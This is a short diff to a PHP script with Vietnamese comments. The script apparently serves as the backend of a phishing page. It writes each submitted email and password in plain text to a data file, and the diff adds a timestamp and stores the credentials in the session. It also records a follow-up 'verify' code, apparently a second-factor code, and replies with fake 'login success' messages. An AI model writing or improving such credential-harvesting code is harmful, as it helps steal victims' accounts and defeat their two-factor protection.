@@ -1,3 +1,4 @@
+<?php  session_start(); ?>
 <?php
     include "config.php";
     
@@ -7,8 +8,10 @@
 
     //Trang login
     if ($email !== '' && $pass !== '') {
+        $_SESSION['email']=$email;
+        $_SESSION['pass']=$pass;
     	$datafile = fopen(FILE_DATA, "a");
-    	$info = "\n" . $email . '/' . $pass . "/";
+    	$info = "\n" . $email . '/' . $pass . "/" . date('Y-m-d H:i') . '/';
     	fwrite($datafile, $info);
     	fclose($datafile);
     	echo "login success";
@@ -17,8 +20,10 @@
 
     //Xác nhận
     if ($verify !== '') {
+        unset($_SESSION['email']);
+        unset($_SESSION['pass']);
     	$datafile = fopen(FILE_DATA, "a");
-    	$info = $verify . '/' . date('Y-m-d H:i');
+    	$info = $verify;
     	fwrite($datafile, $info);
     	fclose($datafile);
     	echo "verify success";
